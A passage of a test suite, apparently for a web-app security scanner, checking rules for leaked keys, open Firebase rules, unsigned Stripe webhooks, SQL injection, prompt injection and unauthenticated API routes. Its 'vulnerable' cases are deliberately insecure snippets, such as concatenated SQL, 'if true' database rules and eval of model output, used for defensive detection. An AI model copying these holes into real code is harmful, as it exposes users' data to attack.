    ]);
    expect(r.titles).toContain("Supabase service-role key read from public variable NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY");
  });
  it("is medium confidence in server-only files", () => {
    expect(
      run({ "app/api/admin/route.ts": "export async function GET() { return process.env.NEXT_PUBLIC_ADMIN_SECRET; }\n" }).all,
    ).toEqual(["app/api/admin/route.ts:1 medium"]);
  });
  it("fixed: server-only names and public keys in code are fine", () => {
    expect(
      run({
        "lib/admin.ts": "createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n",
        "lib/browser.ts": "createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!);\n",
        "lib/notes.md": "Never use process.env.NEXT_PUBLIC_SERVICE_ROLE_KEY in the browser.\n",
      }).all,
    ).toEqual([]);
  });
});

describe("SW-S03 reads code, not mentions", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    return all.findings.filter((f) => f.ruleId === "SW-S03").map((f) => `${f.file}:${f.line}`).sort();
  };
  it("ignores mentions in comments, strings and docs", () => {
    expect(
      run({
        "src/docs.ts":
          "// never read process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY in the browser\n" +
          "const bad = `createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!)`;\n" +
          "/* process.env.VITE_ADMIN_SECRET */ const msg = 'set import.meta.env.VITE_ADMIN_SECRET';\n",
      }),
    ).toEqual([]);
  });
  it("catches destructuring and SvelteKit public imports in .ts files", () => {
    expect(
      run({
        "src/a.ts": "const { NEXT_PUBLIC_DB_PASSWORD, NEXT_PUBLIC_SITE } = process.env;\n",
        "src/routes/+page.ts": "import { PUBLIC_STRIPE_SECRET } from '$env/static/public';\n",
      }),
    ).toEqual(["src/a.ts:1", "src/routes/+page.ts:1"]);
  });
  it("reads Vue and Svelte script blocks, whatever the markup says", () => {
    expect(
      run({
        "src/App.vue":
          "<template><p>Don't panic, it's fine</p></template>\n<script setup>\n" +
          "// import.meta.env.VITE_ADMIN_SECRET is just a comment\nconst k = import.meta.env.VITE_ADMIN_SECRET;\n</script>\n",
        "src/routes/+page.svelte":
          "<p>It's a page</p>\n<script>\n  import { PUBLIC_DB_PASSWORD } from '$env/static/public';\n</script>\n",
      }),
    ).toEqual(["src/App.vue:4", "src/routes/+page.svelte:3"]);
  });
  it("still reads JS that Babel can't parse, by text", () => {
    expect(run({ "src/broken.js": "const k = process.env.NEXT_PUBLIC_ADMIN_SECRET;\n}}}{{{ <<<\n" })).toEqual([
      "src/broken.js:1",
    ]);
  });
});

describe("SW-S04 LLM provider key in client-side code", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-S04");
    return {
      all: mine.map((f) => `${f.file}:${f.line} ${f.confidence}`).sort(),
      titles: mine.map((f) => f.title).sort(),
      s03: all.findings.filter((f) => f.ruleId === "SW-S03").length,
    };
  };

  it("vulnerable: a public-prefixed LLM key in a .env file, by name or by value", () => {
    const r = run({
      ".env.local": `NEXT_PUBLIC_OPENAI_API_KEY=${rand(40)}\nVITE_CHAT=sk-ant-api03-${rand(93)}AA\n`,
    });
    expect(r.all).toEqual([".env.local:1 high", ".env.local:2 high"]);
    expect(r.titles).toEqual(["Anthropic key in public variable VITE_CHAT", "OpenAI key in public variable NEXT_PUBLIC_OPENAI_API_KEY"]);
    expect(r.s03).toBe(0); // reported once, by this rule
  });
  it("fixed: server-only key names, and public settings that aren't keys", () => {
    expect(
      run({
        ".env": `OPENAI_API_KEY=sk-proj-${rand(48)}\nNEXT_PUBLIC_OPENAI_MODEL=gpt-4o\nNEXT_PUBLIC_GEMINI_ENABLED=true\n`,
      }).all,
    ).toEqual([]);
  });
  it("vulnerable: browser code reading the key and switching off the SDK's guard", () => {
    const r = run({
      "lib/ai.ts":
        'import Anthropic from "@anthropic-ai/sdk";\n' +
        "export const client = new Anthropic({\n  apiKey: import.meta.env.VITE_ANTHROPIC_API_KEY,\n  dangerouslyAllowBrowser: true,\n});\n",
    });
    expect(r.all).toEqual(["lib/ai.ts:3 high", "lib/ai.ts:4 high"]);
  });
  it("a guard set to false, or mentioned in a comment, is fine", () => {
    expect(
      run({
        "lib/ai.ts":
          "// never set dangerouslyAllowBrowser: true\nconst c = new OpenAI({ apiKey: process.env.OPENAI_API_KEY, dangerouslyAllowBrowser: false });\n",
      }).all,
    ).toEqual([]);
  });
  it("in server-only files: the public key name is medium, the guard flag is low", () => {
    expect(
      run({
        "app/api/chat/route.ts":
          "const c = new OpenAI({ apiKey: process.env.NEXT_PUBLIC_OPENAI_API_KEY, dangerouslyAllowBrowser: true });\n",
      }).all,
    ).toEqual(["app/api/chat/route.ts:1 low", "app/api/chat/route.ts:1 medium"]);
  });
  it("reads Vue script blocks", () => {
    expect(
      run({
        "src/Chat.vue":
          "<template><p>Don't share keys</p></template>\n<script setup>\nconst c = new Groq({ apiKey: import.meta.env.VITE_GROQ_API_KEY, dangerouslyAllowBrowser: true });\n</script>\n",
      }).titles,
    ).toEqual(["Groq key read from public variable VITE_GROQ_API_KEY", "LLM SDK told to run in the browser (dangerouslyAllowBrowser)"]);
  });

  describe("in files with class accessor fields", () => {
    const S04 = resolve(__dirname, "../fixtures/rules/sw-s04");
    const at = (root: string) =>
      scan(root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES).findings.filter((f) => f.ruleId === "SW-S04");

    it("vulnerable fixture: flags dangerouslyAllowBrowser: true at its own line", () => {
      const f = at(join(S04, "vulnerable"));
      expect(f.map((x) => `${x.file}:${x.line}:${x.column} ${x.confidence}`)).toEqual(["lib/chat-store.ts:10:3 high"]);
      expect(f[0]!.title).toBe("LLM SDK told to run in the browser (dangerouslyAllowBrowser)");
      expect(f[0]!.fix).toMatch(/^Remove `dangerouslyAllowBrowser`\. /);
      expect(f[0]!.fixPrompt).toMatch(/^In lib\/chat-store\.ts, an LLM SDK client is created with dangerouslyAllowBrowser: true\. /);
    });
    it("fixed fixture: nothing flagged", () => expect(at(join(S04, "fixed"))).toEqual([]));
    it("decoy fixture: type members named dangerouslyAllowBrowser are not flagged", () => {
      expect(at(join(S04, "decoy"))).toEqual([]);
    });
    it("variations: a type alias member and a quoted key", () => {
      const cls = "class Store {\n  static accessor busy = false;\n}\n";
      expect(run({ "lib/a.ts": cls + "type O = { 'dangerouslyAllowBrowser': boolean };\n" }).all).toEqual([]);
      expect(
        run({ "lib/a.ts": cls + "const c = new OpenAI({ 'dangerouslyAllowBrowser': true });\n" }).all,
      ).toEqual(["lib/a.ts:4 high"]);
    });
    it("variations: an abstract accessor in .mts and a props interface in a client .tsx", () => {
      expect(
        run({
          "src/base.mts": "abstract class Base {\n  abstract accessor id: string;\n  declare dangerouslyAllowBrowser: boolean;\n}\n",
          "src/Chat.tsx":
            '"use client";\ninterface Props { dangerouslyAllowBrowser: boolean }\nclass S { accessor n: number = 0 }\n' +
            'export function Chat(p: Props) { return <p>{p.dangerouslyAllowBrowser ? "on" : "off"}</p>; }\n',
        }).all,
      ).toEqual([]);
    });
  });
});

describe("SW-D03 and SW-D04 Firebase rules open to everyone", () => {
  const fb = { "package.json": JSON.stringify({ dependencies: { firebase: "10.7.1" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...fb, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-D03" || f.ruleId === "SW-D04");
    return {
      all: mine.map((f) => `${f.ruleId} ${f.file}:${f.line} ${f.severity} ${f.confidence}`).sort(),
      titles: mine.map((f) => f.title).sort(),
    };
  };
  const firestore = (body: string, helpers = "") =>
    `rules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n${helpers}${body}\n  }\n}\n`;

  it("vulnerable: everything open to anyone", () => {
    const r = run({ "firestore.rules": firestore("    match /{document=**} {\n      allow read, write: if true;\n    }") });
    expect(r.all).toEqual(["SW-D03 firestore.rules:5 critical high"]);
  });
  it("vulnerable: Firebase test mode, while the date is in the future", () => {
    const rule = (y: number) =>
      firestore(`    match /{document=**} {\n      allow read, write: if request.time < timestamp.date(${y}, 1, 1);\n    }`);
    expect(run({ "firestore.rules": rule(2099) }).titles).toEqual([
      "Firestore is in test mode: every document open to anyone until 2099-01-01",
    ]);
    expect(run({ "firestore.rules": rule(2020) }).all).toEqual([]); // expired: it denies everyone
  });
  it("any signed-in user on everything is high; through a helper function too", () => {
    const helper = "    function isSignedIn() {\n      return request.auth != null;\n    }\n";
    const r = run({
      "firestore.rules": firestore("    match /{document=**} {\n      allow read, write: if isSignedIn();\n    }", helper),
    });
    expect(r.all).toEqual(["SW-D03 firestore.rules:8 high high"]);
    expect(r.titles[0]).toBe("Firestore rules let any signed-in user read and write every document");
  });
  it("fixed: rules that check the user are not flagged", () => {
    expect(
      run({
        "firestore.rules": firestore(
          "    match /notes/{noteId} {\n" +
            "      allow read, write: if request.auth != null && request.auth.uid == resource.data.ownerId;\n" +
            "      // allow read, write: if true;\n    }",
        ),
      }).all,
    ).toEqual([]);
  });
  it("one collection: a public read is medium, public writes are critical", () => {
    expect(run({ "firestore.rules": firestore("    match /posts/{id} {\n      allow read;\n    }") }).all).toEqual([
      "SW-D03 firestore.rules:5 high medium",
    ]);
    expect(run({ "firestore.rules": firestore("    match /posts/{id} {\n      allow create: if true\n    }") }).all).toEqual([
      "SW-D03 firestore.rules:5 critical high",
    ]);
    // Signed-in users reading one shared collection is normal.
    expect(run({ "firestore.rules": firestore("    match /feed/{id} {\n      allow read: if request.auth != null;\n    }") }).all).toEqual([]);
  });
  it("finds rules files named in firebase.json", () => {
    expect(
      run({
        "firebase.json": JSON.stringify({ firestore: { rules: "config/db.rules" } }),
        "config/db.rules": firestore("    match /{document=**} {\n      allow read, write: if true;\n    }"),
      }).all,
    ).toEqual(["SW-D03 config/db.rules:5 critical high"]);
  });
  it("Realtime Database: open root rules, signed-in writes, and per-user rules", () => {
    const r = run({
      "database.rules.json": JSON.stringify(
        { rules: { ".read": true, ".write": "auth != null", users: { $uid: { ".write": "auth.uid === $uid" } } } },
        null,
        2,
      ),
    });
    expect(r.titles).toEqual([
      "Realtime Database rules let any signed-in user write the whole database",
      "Realtime Database rules let anyone read the whole database",
    ]);
    expect(r.all).toEqual(["SW-D03 database.rules.json:3 high high", "SW-D03 database.rules.json:4 high high"]);
  });
  it("SW-D04: open storage, and per-user storage", () => {
    const storage = (body: string) =>
      `rules_version = '2';\nservice firebase.storage {\n  match /b/{bucket}/o {\n${body}\n  }\n}\n`;
    expect(run({ "storage.rules": storage("    match /{allPaths=**} {\n      allow read, write;\n    }") }).all).toEqual([
      "SW-D04 storage.rules:5 critical high",
    ]);
    expect(
      run({
        "storage.rules": storage(
          "    match /users/{userId}/{allPaths=**} {\n      allow read, write: if request.auth != null && request.auth.uid == userId;\n    }",
        ),
      }).all,
    ).toEqual([]);
  });
});

describe("SW-P01 Stripe webhook without signature check", () => {
  const stripeDeps = { "package.json": JSON.stringify({ dependencies: { stripe: "14.0.0" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...stripeDeps, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    return all.findings.filter((f) => f.ruleId === "SW-P01").map((f) => `${f.file}:${f.line} ${f.confidence}`).sort();
  };
  const unverified =
    "export async function POST(req: Request) {\n  const event = await req.json();\n" +
    '  if (event.type === "invoice.paid") { await markPaid(event.data.object.customer); }\n  return new Response("ok");\n}\n';

  it("vulnerable: trusts the parsed body", () => {
    expect(run({ "app/api/stripe-webhook/route.ts": unverified })).toEqual(["app/api/stripe-webhook/route.ts:2 high"]);
  });
  it("vulnerable: Express handler using req.body", () => {
    expect(
      run({
        "server/hooks.js":
          "app.post('/hooks/stripe', (req, res) => {\n  const event = req.body;\n" +
          "  switch (event.type) { case 'customer.subscription.deleted': downgrade(event); }\n  res.sendStatus(200);\n});\n",
      }),
    ).toEqual(["server/hooks.js:2 high"]);
  });
  it("fixed: constructEvent, in the handler or in a helper it imports", () => {
    expect(
      run({
        "app/api/stripe-webhook/route.ts":
          'import { stripe } from "@/lib/stripe";\nexport async function POST(req: Request) {\n' +
          '  const event = stripe.webhooks.constructEvent(await req.text(), req.headers.get("stripe-signature")!, process.env.STRIPE_WEBHOOK_SECRET!);\n' +
          '  if (event.type === "invoice.paid") {}\n}\n',
      }),
    ).toEqual([]);
    expect(
      run({
        "lib/verify.ts": "export const verify = (b: string, s: string) => stripe.webhooks.constructEvent(b, s, secret);\n",
        "app/api/stripe-webhook/route.ts":
          'import { verify } from "@/lib/verify";\nexport async function POST(req: Request) {\n' +
          '  const event = verify(await req.text(), req.headers.get("stripe-signature")!);\n  if (event.type === "invoice.paid") {}\n}\n',
      }),
    ).toEqual([]);
  });
  it("fixed: fetching the event back from Stripe also proves it", () => {
    expect(
      run({
        "app/api/stripe-webhook/route.ts":
          "export async function POST(req: Request) {\n  const { id } = await req.json();\n" +
          '  const event = await stripe.events.retrieve(id);\n  if (event.type === "invoice.paid") {}\n}\n',
      }),
    ).toEqual([]);
  });
  it("is not fooled by translation keys or JSON.parse elsewhere", () => {
    expect(
      run({
        "app/billing/page.tsx": 'const labels = JSON.parse(raw);\nexport default () => t("invoice.total") + t("product.name");\n',
      }),
    ).toEqual([]);
  });
  it("does not run without Stripe", () => {
    const p = project({ "app/api/stripe-webhook/route.ts": unverified });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.rulesRun).not.toContain("SW-P01");
  });
});

describe("SW-B01 missing security headers", () => {
  const next = (deps: Record<string, string> = {}) => ({
    "package.json": JSON.stringify({ dependencies: { next: "14.2.3", react: "18.2.0", ...deps } }, null, 2),
  });
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-B01");
    return { all: mine.map((f) => `${f.file}:${f.line}`), titles: mine.map((f) => f.title) };
  };
  const fullHeaders =
    "module.exports = {\n  async headers() {\n    return [{ source: '/(.*)', headers: [\n" +
    "      { key: 'Content-Security-Policy', value: \"default-src 'self'; frame-ancestors 'none'\" },\n" +
    "      { key: 'Strict-Transport-Security', value: 'max-age=63072000' },\n    ] }];\n  },\n};\n";

  it("vulnerable: a next.config without headers", () => {
    expect(run({ ...next(), "next.config.mjs": "const nextConfig = {\n  reactStrictMode: true,\n};\nexport default nextConfig;\n" }).all).toEqual([
      "next.config.mjs:1",
    ]);
  });
  it("fixed: all three set (frame-ancestors counts as frame protection)", () => {
    expect(run({ ...next(), "next.config.js": fullHeaders }).all).toEqual([]);
  });
  it("names only what is missing", () => {
    expect(
      run({ ...next(), "next.config.js": "module.exports = { async headers() { return [{ source: '/(.*)', headers: [{ key: 'X-Frame-Options', value: 'DENY' }] }]; } };\n" }).titles,
    ).toEqual(["Security headers missing: Content-Security-Policy, Strict-Transport-Security"]);
  });
  it("counts headers set in middleware or host config", () => {
    expect(
      run({
        ...next(),
        "next.config.js": "module.exports = {};\n",
        "middleware.ts": "res.headers.set('Content-Security-Policy', csp);\nres.headers.set('X-Frame-Options', 'DENY');\n",
        "vercel.json": JSON.stringify({ headers: [{ source: "/(.*)", headers: [{ key: "Strict-Transport-Security", value: "max-age=1" }] }] }),
      }).all,
    ).toEqual([]);
  });
  it("trusts header packages", () => {
    expect(run({ ...next({ "@next-safe/middleware": "0.10.0" }), "next.config.js": "module.exports = {};\n" }).all).toEqual([]);
  });
  it("with no next.config, points at the next dependency", () => {
    expect(run(next()).all).toEqual(["package.json:3"]);
  });
});

describe("SW-A05 SQL built from user input", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    return all.findings.filter((f) => f.ruleId === "SW-A05").map((f) => `${f.file}:${f.line}:${f.column} ${f.confidence}`).sort();
  };

  it("vulnerable: query string concatenated, and template literals", () => {
    expect(
      run({
        "app/api/a/route.ts":
          "export async function GET(req: Request) {\n  const q = new URL(req.url).searchParams.get('q');\n" +
          "  return pool.query(`SELECT * FROM notes WHERE title = '${q}'`);\n}\n",
      }),
    ).toEqual(["app/api/a/route.ts:3:59 high"]);
  });
  it("follows destructured bodies, route params, built strings and server actions", () => {
    expect(
      run({
        "app/api/b/route.ts":
          "export async function POST(req: Request, { params }: { params: { id: string } }) {\n" +
          "  const { name } = await req.json();\n  const sql = 'UPDATE notes SET title = ' + name + ' WHERE id = ' + params.id;\n" +
          "  return db.execute(sql);\n}\n",
        "app/actions.ts": "'use server';\nexport async function remove(id: string) {\n  await knex.raw(`DELETE FROM notes WHERE id = ${id}`);\n}\n",
        "server/express.js": "app.get('/u', (req, res) => db.query('SELECT * FROM users WHERE email = \"' + req.query.email + '\"'));\n",
      }),
    ).toEqual(["app/actions.ts:3:50 high", "app/api/b/route.ts:3:45 high", "server/express.js:1:78 high"]);
  });
  it("fixed: placeholders, tagged templates and Prisma's safe API", () => {
    expect(
      run({
        "app/api/a/route.ts":
          "export async function GET(req: Request) {\n  const q = new URL(req.url).searchParams.get('q');\n" +
          "  await pool.query('SELECT * FROM notes WHERE title = $1', [q]);\n" +
          "  await sql`SELECT * FROM notes WHERE title = ${q}`;\n" +
          "  await prisma.$queryRaw`SELECT * FROM notes WHERE title = ${q}`;\n}\n",
      }),
    ).toEqual([]);
  });
  it("values from the session aren't user input; unknown values are medium", () => {
    expect(
      run({
        "app/api/me/route.ts":
          "export async function GET(req: Request) {\n  const user = await getUser(req);\n" +
          "  return pool.query(\"SELECT * FROM notes WHERE user_id = '\" + user.id + \"'\");\n}\n",
      }),
    ).toEqual(["app/api/me/route.ts:3:63 medium"]);
  });
  it("ignores non-SQL strings and query() calls on other things", () => {
    expect(
      run({
        "lib/x.ts": "const el = document.querySelector('#' + id);\nconst r = router.query('page ' + n);\nconsole.log('selected ' + item + ' from list');\n",
      }),
    ).toEqual([]);
  });
});

describe("SW-L01 user input in the system prompt", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    return all.findings.filter((f) => f.ruleId === "SW-L01").map((f) => `${f.file}:${f.line}`).sort();
  };
  const route = (body: string) =>
    `export async function POST(req: Request) {\n  const { message, persona } = await req.json();\n${body}\n}\n`;

  it("vulnerable: OpenAI, Anthropic and AI SDK system prompts with request input", () => {
    expect(
      run({
        "app/api/a/route.ts": route(
          "  await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'system', content: `You are ${persona}` }] });",
        ),
        "app/api/b/route.ts": route("  await anthropic.messages.create({ model: 'claude', system: 'Act as ' + persona, messages: [] });"),
        "app/api/c/route.ts": route("  const sys = `Persona: ${persona}`;\n  await generateText({ model, system: sys, prompt: message });"),
      }),
    ).toEqual(["app/api/a/route.ts:3", "app/api/b/route.ts:3", "app/api/c/route.ts:3"]);
  });
  it("fixed: fixed system prompt, input as the user message, or an allow-list lookup", () => {
    expect(
      run({
        "app/api/a/route.ts": route(
          "  const PERSONAS = { tutor: 'You are a tutor.' };\n" +
            "  await openai.chat.completions.create({ model: 'gpt-4o', messages: [\n" +
            "    { role: 'system', content: PERSONAS[persona] ?? PERSONAS.tutor },\n    { role: 'user', content: message },\n  ] });",
        ),
      }),
    ).toEqual([]); // an allow-list lookup can only produce strings you wrote
  });
  it("is not fooled by unrelated `system` keys or server-side values", () => {
    expect(
      run({
        "lib/theme.ts": "export const theme = { system: 'dark ' + userPref, colors: {} };\n",
        "app/api/d/route.ts":
          "export async function POST(req: Request) {\n  const user = await getUser(req);\n" +
          "  await openai.chat.completions.create({ model: 'm', messages: [{ role: 'system', content: 'Name: ' + user.name }] });\n}\n",
      }),
    ).toEqual([]);
  });
});

describe("SW-L02 model output rendered as HTML or run as code", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-L02");
    return { all: mine.map((f) => `${f.file}:${f.line}`).sort(), titles: mine.map((f) => f.title).sort() };
  };

  it("vulnerable: through React state, useChat messages, innerHTML, eval and SQL", () => {
    const r = run({
      "app/a.tsx":
        '"use client";\nexport default function A() {\n  const [reply, setReply] = useState("");\n' +
        "  async function go() { const c = await openai.chat.completions.create({}); setReply(c.choices[0].message.content); }\n" +
        "  return <div dangerouslySetInnerHTML={{ __html: reply }} />;\n}\n",
      "app/b.tsx":
        '"use client";\nexport default function B() {\n  const { messages } = useChat();\n' +
        "  return messages.map((m) => <p key={m.id} dangerouslySetInnerHTML={{ __html: m.content }} />);\n}\n",
      "lib/c.ts":
        "const { text } = await generateText({ model, prompt });\nel.innerHTML = text;\neval(text);\n" +
        "await db.query('SELECT * FROM t WHERE ' + text);\n",
    });
    expect(r.all).toEqual(["app/a.tsx:5", "app/b.tsx:4", "lib/c.ts:2", "lib/c.ts:3", "lib/c.ts:4"]);
    expect(r.titles).toEqual([
      "Model output rendered as HTML",
      "Model output rendered as HTML",
      "Model output rendered as HTML",
      "Model output run as code",
      "Model output used in a SQL query",
    ]);
  });
  it("fixed: rendered as text, or sanitised first", () => {
    expect(
      run({
        "app/a.tsx":
          '"use client";\nexport default function A() {\n  const [reply, setReply] = useState("");\n' +
          "  async function go() { const c = await openai.chat.completions.create({}); setReply(c.choices[0].message.content); }\n" +
          "  return <><div>{reply}</div><div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(reply) }} /></>;\n}\n",
        "lib/c.ts": "const { text } = await generateText({ model, prompt });\nconst safe = sanitizeHtml(text);\nel.innerHTML = safe;\n",
      }).all,
    ).toEqual([]);
  });
  it("leaves model-chosen shell commands to SW-L03, and ignores unrelated HTML", () => {
    expect(
      run({
        "lib/d.ts":
          "import { exec } from 'node:child_process';\nconst c = await openai.chat.completions.create({});\n" +
          "child_process.exec(c.choices[0].message.content);\nel.innerHTML = '<b>' + title + '</b>';\n",
      }).all,
    ).toEqual([]);
  });
});

describe("SW-A01 API route with no auth check", () => {
  const next = { "package.json": JSON.stringify({ dependencies: { next: "14.2.3" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...next, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-A01");
    return { all: mine.map((f) => `${f.file}:${f.line} ${f.confidence}`).sort(), titles: mine.map((f) => f.title).sort() };
  };
  const write = "export async function POST(req: Request) {\n  const body = await req.json();\n  await db.from('notes').insert(body);\n  return Response.json({ ok: true });\n}\n";

  it("vulnerable: a write with no check is high, a read is medium", () => {
    const r = run({
      "app/api/notes/route.ts": write + "export async function GET() {\n  return Response.json(await db.from('notes').select());\n}\n",
      "app/(admin)/api/users/[id]/route.ts": "export const DELETE = async (req: Request) => {\n  await prisma.user.delete({ where: { id: 1 } });\n};\n",
    });
    expect(r.all).toEqual(["app/(admin)/api/users/[id]/route.ts:1 high", "app/api/notes/route.ts:1 high", "app/api/notes/route.ts:6 medium"]);
    expect(r.titles).toContain("DELETE /api/users/[id] has no auth check");
  });
  it("fixed: the common auth libraries", () => {
    const body = (check: string) => `export async function POST(req: Request) {\n  ${check}\n  await db.from('notes').insert({});\n}\n`;
    expect(
      run({
        "app/api/a/route.ts": body("const user = await getUser(req); if (!user) return new Response(null, { status: 401 });"),
        "app/api/b/route.ts": body("const { userId } = auth(); if (!userId) return new Response(null, { status: 401 });"),
        "app/api/c/route.ts": body("const session = await getServerSession(authOptions); if (!session) return;"),
        "app/api/d/route.ts": body("const { data } = await supabase.auth.getUser(); if (!data.user) return;"),
        "app/api/e/route.ts": body("const user = await currentUser();"),
        "app/api/f/route.ts": body("const decoded = await admin.auth().verifyIdToken(token);"),
        "app/api/g/route.ts": body("if (req.headers.get('authorization') !== `Bearer ${process.env.CRON_SECRET}`) return new Response(null, { status: 401 });"),
      }).all,
    ).toEqual([]);
  });
  it("fixed: auth wrappers and helpers, local or imported", () => {
    expect(
      run({
        "app/api/a/route.ts": "export const POST = withAuth(async (req) => { await db.insert(); });\n",
        "app/api/b/route.ts": "export const POST = auth(async (req) => { await db.insert(); });\n",
        "app/api/c/route.ts": "async function guard() { const s = await getServerSession(); if (!s) throw new Error(); return s; }\nexport async function POST() { await guard(); await db.insert(); }\n",
        "lib/guards.ts": "export async function mustBeAdmin() {\n  const s = await getServerSession(authOptions);\n  if (s?.user.role !== 'admin') throw new Error('no');\n}\n",
        "app/api/d/route.ts": "import { mustBeAdmin } from '@/lib/guards';\nexport async function DELETE() { await mustBeAdmin(); await db.delete(); }\n",
      }).all,
    ).toEqual([]);
  });
  it("leaves public-by-design routes alone", () => {
    expect(
      run({
        "app/api/webhooks/stripe/route.ts": write,
        "app/api/auth/[...nextauth]/route.ts": "export const POST = handler;\nexport async function GET() { await db.insert(); }\n",
        "app/api/health/route.ts": "export async function GET() { return Response.json({ ok: true }); }\n",
        "app/api/hooks/clerk/route.ts": "import { Webhook } from 'svix';\n" + write,
        "app/api/assistant/route.ts": "export async function OPTIONS() { return new Response(null); }\n",
      }).all,
    ).toEqual([]);
  });
  it("counts middleware that enforces auth on the route's path", () => {
    const mw = (matcher: string) =>
      "export default clerkMiddleware((auth, req) => { if (isProtected(req)) auth().protect(); });\n" +
      `export const config = { matcher: ${matcher} };\n`;
    expect(run({ "middleware.ts": mw("['/api/:path*']"), "app/api/notes/route.ts": write }).all).toEqual([]);
    expect(run({ "middleware.ts": mw("['/dashboard/:path*']"), "app/api/notes/route.ts": write }).all).toEqual([
      "app/api/notes/route.ts:1 high",
    ]);
    // Middleware that only refreshes a session doesn't keep anyone out.
    expect(
      run({ "middleware.ts": "export async function middleware(req) { return await updateSession(req); }\n", "app/api/notes/route.ts": write }).all,
    ).toEqual(["app/api/notes/route.ts:1 high"]);
  });
  it("pages/api handlers and server actions", () => {
    expect(
      run({
        "pages/api/notes.ts": "export default async function handler(req, res) {\n  await db.notes.create({ data: req.body });\n  res.json({});\n}\n",
        "pages/api/list.ts": "export default async function handler(req, res) { res.json(await db.notes.findMany()); }\n",
        "app/actions.ts": "'use server';\nexport async function deleteNote(id: string) {\n  await db.notes.delete({ where: { id } });\n}\n" +
          "export async function rename(id: string, t: string) {\n  const user = await getCurrentUser();\n  await db.notes.update({});\n}\n",
      }).all,
    ).toEqual(["app/actions.ts:2 medium", "pages/api/list.ts:1 medium", "pages/api/notes.ts:1 high"]);
  });
  it("says when a sibling handler does check", () => {
    const r = run({
      "app/api/notes/route.ts": "export async function GET(req: Request) { const u = await getUser(req); }\n" + write,
    });
    expect(r.all).toEqual(["app/api/notes/route.ts:2 high"]);
  });
});

describe("SW-A02 record fetched by ID with no ownership check", () => {
  const next = { "package.json": JSON.stringify({ dependencies: { next: "14.2.3" } }) };
  const admin = { "lib/admin.ts": "export const supabaseAdmin = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n" };
  const run = (files: Record<string, string>) => {
    const p = project({ ...next, ...admin, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-A02");
    return { all: mine.map((f) => `${f.file}:${f.line} ${f.confidence}`).sort(), titles: mine.map((f) => f.title).sort(), a01: all.findings.filter((f) => f.ruleId === "SW-A01").length };
  };
  const route = (query: string, imports = "import { supabaseAdmin } from '@/lib/admin';\n") =>
    imports +
    "export async function GET(req: Request, { params }: { params: { id: string } }) {\n" +
    "  const user = await getUser(req);\n  if (!user) return new Response(null, { status: 401 });\n" +
    `  ${query}\n}\n`;

  it("vulnerable: the Supabase admin client, by route param or query string", () => {
    const r = run({
      "app/api/notes/[id]/route.ts": route("const { data } = await supabaseAdmin.from('notes').select('*').eq('id', params.id).single();"),
      "app/api/files/route.ts": route(
        "const id = new URL(req.url).searchParams.get('id');\n  await supabaseAdmin.from('files').delete().match({ id });",
      ),
    });
    expect(r.all).toEqual(["app/api/files/route.ts:6 high", "app/api/notes/[id]/route.ts:5 high"]);
    expect(r.titles).toContain("GET /api/files deletes a record from files by ID without checking the owner");
  });
  it("fixed: an owner filter, a later owner comparison, or the normal (RLS) client", () => {
    expect(
      run({
        "app/api/a/[id]/route.ts": route("await supabaseAdmin.from('notes').select().eq('id', params.id).eq('user_id', user.id);"),
        "app/api/b/[id]/route.ts": route(
          "const { data } = await supabaseAdmin.from('notes').select().eq('id', params.id).single();\n  if (data.user_id !== user.id) return new Response(null, { status: 404 });",
        ),
        "app/api/c/[id]/route.ts": route("await supabase.from('notes').select().eq('id', params.id);", "import { supabase } from '@/lib/client';\n"),
        "lib/client.ts": "export const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!);\n",
      }).all,
    ).toEqual([]);
  });
  it("Prisma and Drizzle", () => {
    expect(
      run({
        "app/api/p/[id]/route.ts": route("await prisma.invoice.findUnique({ where: { id: params.id } });", ""),
        "app/api/q/[id]/route.ts": route("await prisma.invoice.findFirst({ where: { id: params.id, userId: user.id } });", ""),
        "app/api/d/[id]/route.ts": route("await db.delete(notes).where(eq(notes.id, params.id));", ""),
